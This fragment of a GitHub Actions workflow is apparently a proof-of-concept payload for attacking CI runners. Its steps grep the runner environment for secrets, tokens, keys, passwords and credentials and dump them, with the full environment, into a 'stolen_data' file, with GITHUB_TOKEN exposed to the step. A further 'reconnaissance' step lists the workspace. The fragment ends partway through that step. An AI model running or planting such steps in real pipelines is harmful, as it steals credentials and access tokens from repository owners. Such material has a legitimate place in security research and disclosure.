        env | grep -i "secret\|token\|key\|pass\|cred" >> /tmp/poc-exfil/stolen_data.txt 2>/dev/null || true
        echo "" >> /tmp/poc-exfil/stolen_data.txt
        echo "--- FULL ENVIRONMENT ---" >> /tmp/poc-exfil/stolen_data.txt
        env | sort >> /tmp/poc-exfil/stolen_data.txt

        echo "[EXFIL] Data written to /tmp/poc-exfil/stolen_data.txt"

      shell: bash
      env:
        GITHUB_TOKEN: ${{ github.token }}

    # =========================================================================
    # PAYLOAD STEP 2: Demonstrate file system access on the runner
    # =========================================================================
    - name: "Runner reconnaissance"
      run: |
        echo ""
        echo "[RECON] Demonstrating runner access..."
        echo "[RECON] Listing GitHub workspace:"
        ls -la $GITHUB_WORKSPACE/ 2>/dev/null | head -20
